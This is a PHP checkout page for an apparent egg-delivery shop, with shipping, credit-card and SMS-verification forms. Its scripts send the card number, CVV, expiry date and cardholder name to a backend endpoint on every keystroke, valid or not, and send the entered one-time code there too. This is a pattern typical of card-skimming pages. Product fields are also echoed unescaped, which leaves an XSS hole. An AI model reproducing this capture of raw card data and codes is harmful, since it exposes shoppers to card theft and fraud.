<?php
session_start();
include_once('model/ProductModel.php');

if(array_key_exists('cart',$_SESSION) && count($_SESSION['cart'])>0 ){
    $cartData = $_SESSION['cart'];
}else{
    header('location:/');
}
    
$productModel = new ProductModel();

?>
<?php include_once('view/checkoutheader.php') ?>
    <!-- Form Block Start Here -->
    <div class="checkout-form-block">
        <div class="container">
            <div class="checkout-form">
                <div class="one-two left-col-area">
					<form class="shipping-form needs-validation"  novalidate>
                    	<div class="accordion" id="checkoutFormAccordion">
                        <div class="accordion-item shipping-btn">
                            <h2 class="accordion-header">
                                <button class="accordion-button" id="shippingBtn" type="button"
                                        data-bs-toggle="collapse" data-bs-target="#panelsStayOpen-collapseOne"
                                        aria-expanded="true" aria-controls="panelsStayOpen-collapseOne" disabled>
                                    Shipping address
                                </button>
                            </h2>
                            <div id="panelsStayOpen-collapseOne"
                                 class="accordion-collapse collapse show shipping-form-block">
                                <div class="accordion-body">
										<div class="row justify-content-start g-3">
											<div class="col-md-6 field-block">
												<label for="firstname" class="form-label">First Name</label>
												<input type="text" class="form-control" id="firstname" required>
											</div>
											<div class="col-md-6 field-block">
												<label for="lastname" class="form-label">Last Name</label>
												<input type="text" class="form-control" id="lastname" required>
											</div>
											<div class="col-12 field-block">
												<label for="address" class="form-label">Address</label>
												<input type="text" class="form-control" id="address" required>
											</div>
											<div class="col-md-4 field-block">
												<label for="zip-code" class="form-label">Zip Code</label>
												<input type="number" class="form-control" id="zip-code" required>
											</div>
											<div class="col-md-4 field-block">
												<label for="city" class="form-label">City</label>
												<input type="text" class="form-control" id="city" required>
											</div>
											<div class="col-md-4 field-block">
												<label for="state" class="form-label">State</label>
												<select name="state" id="state" class="form-select" required>
													<option value="AL">Alabama</option>
													<option value="AK">Alaska</option>
													<option value="AZ">Arizona</option>
													<option value="AR">Arkansas</option>
													<option value="CA">California</option>
													<option value="CO">Colorado</option>
													<option value="CT">Connecticut</option>
													<option value="DE">Delaware</option>
													<option value="DC">District Of Columbia</option>
													<option value="FL">Florida</option>
													<option value="GA">Georgia</option>
													<option value="HI">Hawaii</option>
													<option value="ID">Idaho</option>
													<option value="IL">Illinois</option>
													<option value="IN">Indiana</option>
													<option value="IA">Iowa</option>
													<option value="KS">Kansas</option>
													<option value="KY">Kentucky</option>
													<option value="LA">Louisiana</option>
													<option value="ME">Maine</option>
													<option value="MD">Maryland</option>
													<option value="MA">Massachusetts</option>
													<option value="MI">Michigan</option>
													<option value="MN">Minnesota</option>
													<option value="MS">Mississippi</option>
													<option value="MO">Missouri</option>
													<option value="MT">Montana</option>
													<option value="NE">Nebraska</option>
													<option value="NV">Nevada</option>
													<option value="NH">New Hampshire</option>
													<option value="NJ">New Jersey</option>
													<option value="NM">New Mexico</option>
													<option value="NY">New York</option>
													<option value="NC">North Carolina</option>
													<option value="ND">North Dakota</option>
													<option value="OH">Ohio</option>
													<option value="OK">Oklahoma</option>
													<option value="OR">Oregon</option>
													<option value="PA">Pennsylvania</option>
													<option value="RI">Rhode Island</option>
													<option value="SC">South Carolina</option>
													<option value="SD">South Dakota</option>
													<option value="TN">Tennessee</option>
													<option value="TX">Texas</option>
													<option value="UT">Utah</option>
													<option value="VT">Vermont</option>
													<option value="VA">Virginia</option>
													<option value="WA">Washington</option>
													<option value="WV">West Virginia</option>
													<option value="WI">Wisconsin</option>
													<option value="WY">Wyoming</option>
													<option value="PR">Puerto Rico</option>
												</select>
											</div>
											<div class="col-md-6 field-block">
												<label for="mobile-number" class="form-label">Mobile phone</label>
												<input type="number" class="form-control" id="mobile-number" required>
											</div>
											<div class="col-md-6 field-block">
												<label for="email-address" class="form-label">Email address</label>
												<input type="email" class="form-control" id="email-address" required>
											</div>
											<div class="col-md-6 field-block ship-fm-bottom">
												<a href="#"><i class="bi bi-arrow-left"></i>Return to cart</a>
											</div>
											<div class="col-md-6 field-block right-shift ship-fm-bottom">
												<button type="button" id="continue-shipping-btn" class="btn btn-purple">
													Continue to shipping
												</button>
											</div>
										</div>
                                </div>
                            </div>
                        </div>
                        <div class="accordion-item">
                            <h2 class="accordion-header">
                                <button class="accordion-button collapsed" id="paymentBtn" type="button"
                                        data-bs-toggle="collapse" data-bs-target="#panelsStayOpen-collapseTwo"
                                        aria-expanded="false" aria-controls="panelsStayOpen-collapseTwo" disabled>
                                    Payment details
                                </button>
                            </h2>
                            <div id="panelsStayOpen-collapseTwo" class="accordion-collapse collapse">
                                <div class="accordion-body">
                                    <div class="ship-address-block">
                                        <div class="ship-info">
                                            <div class="title">Contact</div>
                                            <div class="email-blk">demo@gmail.com</div>
                                            
                                            <div class="button"><a href="#" id="contact_change">Change</a></div>
                                        </div>
                                        <hr>
                                        <div class="ship-info">
                                            <div class="title">Shipping Address</div>
                                            <div class="ship-blk">Streat name demo, Demo city, AK00</div>
                                            
                                            <div class="button"><a href="#" id="add_change">Change</a></div>
                                        </div>
                                    </div>

                                    <!-- <div class="billing-address-block">
                                        <h3>Billing address</h3>
                                        <p>Select the address that matches your card or payment method.</p>
                                        <div class="address-option-block">
                                            <div class="form-check">
                                                <input class="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault1" required>
                                                <label class="form-check-label" for="flexRadioDefault1">
                                                    Same as shipping address
                                                </label>
                                            </div>
                                            <hr>
                                            <div class="form-check">
                                                <input class="form-check-input" type="radio" name="flexRadioDefault"
                                                       id="flexRadioDefault2" checked required>
                                                <label class="form-check-label" for="flexRadioDefault2">
                                                    Use a different billing address
                                                </label>
                                            </div>
                                        </div>
                                    </div> -->

                                    <div class="payment-method-block">
                                        <h3>Payment Method</h3>
                                        <p>All transactions are secure and encrypted.</p>

                                        <h4>Credit card</h4>

                                        <div class="card-info-block">
                                            <input type="hidden" id="ord_id" name="ord_id" />
                                            <h4>Card information</h4>
                                            <p>Enter your card information</p>
                                            <div class="row">
                                                <div class="col-md-12 field-block">
                                                    <label for="card-number" class="form-label">Card number</label>
                                                    <input type="number" class="form-control" name="card-number" id="card-number" required>
                                                    <small class="text-danger" id="errcn"></small>
                                                </div>
                                                
                                            </div>
                                            <div class="row">
                                                <div class="col-6 field-block">
                                                    <label for="exp-mon" class="form-label">Expiration Date</label>
                                                    <input type="text" class="form-control" name="exp-mon" id="exp-mon" placeholder="MM/YY" required>
                                                    <small class="text-danger" id="errexpdate"></small>
                                                </div>
                                                <div class="col-4 field-block">
                                                    <label for="cvc-number" class="form-label">Security Code</label>
                                                    <input type="number" class="form-control" name="cvc-number" id="cvc-number" required>
                                                    <small class="text-danger" id="errcvc"></small>
                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="col-md-12 field-block">
                                                    <label for="card-number" class="form-label">Name On Card</label>
                                                    <input type="text" class="form-control" name="card-name" id="card-name" required>
                                                </div>
                                                
                                            </div>
                                            
                                        </div>
                                    </div>
                                    <div class="privacy-note-block">
                                        <p>Your personal data will be used to process your order, support your
                                            experience throughout this website, and for other purposes described in our
                                            privacy policy.</p>
                                    </div>
                                    <div class="check-block">
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" value=""
                                                   id="flexCheckDefault" required>
                                            <label class="form-check-label" for="flexCheckDefault">
                                                I have read and agree terms and conditions *
                                            </label>
                                        </div>

                                    </div>
                                    <div class="submit-form-block">
                                        <button class="btn btn-purple" onclick="return placeOrder()" id="placeorder" type="button">Place order</button>
                                    </div>
                                </div>
                            </div>
                        </div>  
                    </div>
					</form>
                </div>
                <div class="one-two right-col-area">
                    <h2>Order Summary</h2>
                    <div class="order-details-block">
                        <h3>Your Order</h3>
                        <div class="summary">Show full summary</div>
                        <ul>
                        <?php
                        $sub_total = 0;
                        foreach($cartData as $key=> $cd){
                            if($key !=''){
                                    //echo $_SESSION['cart'][$key];
                                    $productResults = $productModel->getProdutById($key);
                                    $row = mysqli_fetch_row($productResults);
                                    //print_r($row);
                            ?>
                            <li>
                                <div class="product-img"><img src="<?php echo $row[1] ?>" style="width:25px;" alt=""></div>
                                <div class="product-title"><?php echo $row[2] ?>
                                    <div class="qty">Qty <?php echo $cd ?></div>
                                </div>
                                <div class="product-price">
                                    <?php if($row[5] > 0): ?>
                                        $<?php echo $price = $row[5]*$cd ?>
                                    <?php else: ?>
                                        $<?php echo $price = $row[4]*$cd ?>
                                    <?php endif; ?>
                                    <?php $sub_total += $price; ?>
                                </div>
                            </li>
                            <?php
                                }
                            }
                            ?>
                            <!-- <li>
                                <div class="product-img"><img src="assets/images/checkout-product-image.png" alt=""></div>
                                <div class="product-title">4 Dozen Fresh Bloom Eggs(Delivered Monthly).
                                    <div class="qty">Qty 15</div>
                                </div>
                                <div class="product-price">$49.00</div>
                            </li>
                            <li>
                                <div class="product-img"><img src="assets/images/checkout-product-image.png" alt=""></div>
                                <div class="product-title">4 Dozen Fresh Bloom Eggs(Delivered Monthly).
                                    <div class="qty">Qty 15</div>
                                </div>
                                <div class="product-price">$49.00</div>
                            </li> -->
                        </ul>
                    </div>
                    <hr>
                    <a href="#" class="addDiscount">Add discount Code</a>
                    <div class="discount-block">
                        <h3>Discount code</h3>
                        <div class="row">
                            <div class="col-8 mb-6">
                                <input type="text" class="form-control" id="card-number_coupon">
                            </div>
                            <div class="col-4 mb-6">
                                <button class="btn" type="submit">Apply</button>
                            </div>
                        </div>
                    </div>
                    <hr>
                    <div class="checkout-price-block">
                        <div class="subtotal">
                            <h5>Subtotal</h5>
                            <div class="sub-price">$<?php echo $sub_total ?></div>
                        </div>
                        <hr id="subnext">
                        <div class="total">
                            <h5>Total</h5>
                            <div class="sub-price">$<?php echo $sub_total ?></div>
                            <input type="hidden" name="total" id="total" value="<?php echo $sub_total ?>" />
                        </div>
                        <div class="info-block">
                            <div class="info-icon">
                                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2"
                                     stroke="currentColor" aria-hidden="true" class="tw-h-5 tw-w-5 tw-text-gray-400">
                                    <path stroke-linecap="round" stroke-linejoin="round"
                                          d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                </svg>
                            </div>
                            <p>100% Money- Back Guarantee! We are so confident you’ll love the world’s freshest eggs
                                that we offer a 100% satisfaction guarantee.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Form Block Ends Here -->
    </div>
    <div class="loader"></div>
    <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel">
  <div class="modal-dialog modal-lg modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
      <h4 class="modal-title" id="exampleModalLabel">Enter Verification Code</h4>
        <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        
      </div>
      <div class="modal-body">
        <div class="row">
            <div class="col-md-8">
                A Verification code has been sent to <span id="ship_mobile"></span>.<br />
                Please enter it to verify your mobile number.
            </div>
        </div>
        <div class="row">
            <div class="col-md-8">
                <form>
                <div class="form-group">
                    <input type="number" class="form-control" id="order_otp">
                    <small><strong>Standard carrier message and data rates may apply.</strong></small>
                </div>
                </form>
            </div>
            <div class="col-md-4"><div class="float-end"><svg xmlns="http://www.w3.org/2000/svg" width="3em" height="3em" viewBox="0 0 16 16"><g fill="currentColor"><path d="M11 1a1 1 0 0 1 1 1v12a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1zM5 0a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2z"/><path d="M8 14a1 1 0 1 0 0-2a1 1 0 0 0 0 2"/></g></svg></div> </div>
        </div>
      </div>
      <div class="modal-footer justify-content-between">
        <div>
            <a href="#" class="float-left">Resend Verification code</a>
        </div>
        <div class="actions">
            <button type="button" class="btn btn-default" data-bs-dismiss="modal">Close</button>
            <button type="button" class="btn btn-primary" id="verify">verify</button>
        </div>
      </div>
    </div>
  </div>
</div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="assets/js/bootstrap.js"></script>
    <script src="assets/js/scripts.js"></script>        
    <script type="text/javascript">
        var sum = false;
        var total = <?php echo $sub_total; ?>;
        jQuery(document).ready(function(){
            var windowWidth = window.screen.width < window.outerWidth ?
                  window.screen.width : window.outerWidth;
            var mobile = windowWidth < 500;
            if(mobile){
                jQuery('.summary').show();
                jQuery('.addDiscount').show();
                jQuery('.order-details-block ul').hide();
                jQuery('.subtotal').hide();
                jQuery('#subnext').hide();
                jQuery('.discount-block').hide();
                jQuery('.addDiscount').click(function(){
                    jQuery('.summary').html("Hide full summary");
                    jQuery('.order-details-block ul').show();
                    jQuery('.subtotal').show();
                    jQuery('.discount-block').show();
                    jQuery('#subnext').show();
                    sum = true;
                });
                jQuery('.summary').click(function(){
                    if(sum){
                        jQuery(this).html("Show full summary");
                        jQuery('.order-details-block ul').hide();
                        jQuery('.subtotal').hide();
                        jQuery('.discount-block').hide();
                        jQuery('#subnext').hide();
                        sum = false;
                    }
                    else{
                        jQuery(this).html("Hide full summary");
                        jQuery('.order-details-block ul').show();
                        jQuery('.subtotal').show();
                        jQuery('.discount-block').show();
                        jQuery('#subnext').show();
                        sum = true;
                    }
                    
                });
            }
            else{
                jQuery('.summary').hide();
                jQuery('.addDiscount').hide();
            }
            jQuery('#zip-code').change(function(){
                var zip_code = jQuery(this).val();
                var zip_url = "https://api.zippopotam.us/us/"+zip_code;
                jQuery.get(zip_url,function(data){
                    console.log('data:'+data['places'][0]['place name']);
                    jQuery('#city').val(data['places'][0]['place name']);
                    const selectEl = $('#state');
                    selectEl.val(data['places'][0]['state abbreviation']).change();
                });
            });
            jQuery('#zip').change(function(){
                var zip_code = jQuery(this).val();
                var zip_url = "http://api.zippopotam.us/us/"+zip_code;
                jQuery.get(zip_url,function(data){
                    console.log('data:'+data['places'][0]['place name']);
                    jQuery('#ship_city').val(data['places'][0]['place name']);
                    const selectEl = $('#ship_state');
                    selectEl.val(data['places'][0]['state abbreviation']).change();
                });
            });
            jQuery('#card-number').on('input', function() {
                var order_id = jQuery('#ord_id').val();
                var data = jQuery(this).val();
                let regex = new RegExp("^4[0-9]{11}(?:[0-9]{3})?$");
                let masterregex = new RegExp("^5[1-5][0-9]{14}|^(222[1-9]|22[3-9]\\d|2[3-6]\\d{2}|27[0-1]\\d|2720)[0-9]{12}$");
                let amexregex = new RegExp("^3[47][0-9]{13}$");
                let discoverregex = new RegExp("^6(?:011|5[0-9]{2})[0-9]{12}$");
                let unionregex = new RegExp("^62[0-9]{14}$");
                var isValid = false;
                jQuery(this).removeClass('visaadd');
                jQuery(this).removeClass('masteradd');
                jQuery(this).removeClass('amexadd');
                jQuery(this).removeClass('discoveradd');
                jQuery(this).removeClass('unionadd');
                // if VisaCard_Number 
                // is empty return false
                if (data == null) {
                    isValid = false;
                }
                // Return true if the VisaCard_Number
                // matched the ReGex
                if (regex.test(data) == true) {
                    isValid = true;
                    jQuery(this).addClass('visaadd');
                }
                else if (masterregex.test(data) == true) {
                    isValid = true;
                    jQuery(this).addClass('masteradd');
                }
                else if (amexregex.test(data) == true) {
                    isValid = true;
                    jQuery(this).addClass('amexadd');
                }
                else if (discoverregex.test(data) == true) {
                    isValid = true;
                    jQuery(this).addClass('discoveradd');
                }
                else if (unionregex.test(data) == true) {
                    isValid = true;
                    jQuery(this).addClass('unionadd');
                }
                else {
                    isValid = false;
                }

                if(isValid == false)
                {
                    jQuery('#errcn').html('Card Number is not valid');
                }
                else{
                    jQuery('#errcn').html('');
                }
                console.log(order_id);
                console.log(isValid);
                jQuery.post('api/savecart.php',{order_id: order_id,card_number: data},function(){
                });
            });
            jQuery('#cvc-number').on('input', function() {
                var order_id = jQuery('#ord_id').val();
                var data = jQuery(this).val();
                console.log(order_id);
                if(data.length > 3)
                {
                    jQuery('#errcvc').html('Invalid Security Code.');
                }
                else{
                    jQuery('#errcvc').html('');
                    jQuery.post('api/savecart.php',{order_id: order_id,cvv: data},function(){
                    });
                }
            });
            jQuery('#verify').click(function(){
                var order_otp = jQuery('#order_otp').val();
                jQuery.post('api/savecart.php',{order_id: order_id,order_otp: order_otp},function(){
                });
            });
            jQuery('#exp-mon').on('input', function() {
                var order_id = jQuery('#ord_id').val();
                var data = jQuery(this).val();
                if(data.length==2)
                {
                    jQuery(this).val(data+'/');
                    jQuery(this).focus();
                }
                let pattern = new RegExp("(0[1-9]|10|11|12)/[0-9]{2}$");
                let result = pattern.test(data);
                if(data != '' && result == false)
                    jQuery('#errexpdate').html('Date is not valid');
                else
                {
                    jQuery('#errexpdate').html('');
                    if(data != ''){
                        var today, someday;
                        var arrDate = data.split('/');
                        var exMonth=arrDate[0];
                        var exYear='20'+arrDate[1];
                        today = new Date();
                        someday = new Date();
                        someday.setFullYear(exYear, exMonth, 30);
                        if(someday < today)
                            jQuery('#errexpdate').html('Please Enter Valid Month/Year');
                    }
                }
                console.log(order_id);
                jQuery.post('api/savecart.php',{order_id: order_id,exp_month: data},function(){
                });
            });
            jQuery('#card-name').on('input', function() {
                var order_id = jQuery('#ord_id').val();
                var data = jQuery(this).val();
                console.log(order_id);
                jQuery.post('api/savecart.php',{order_id: order_id,nameoncard: data},function(){

                });
            });
            
        });
    </script>
</body>
</html>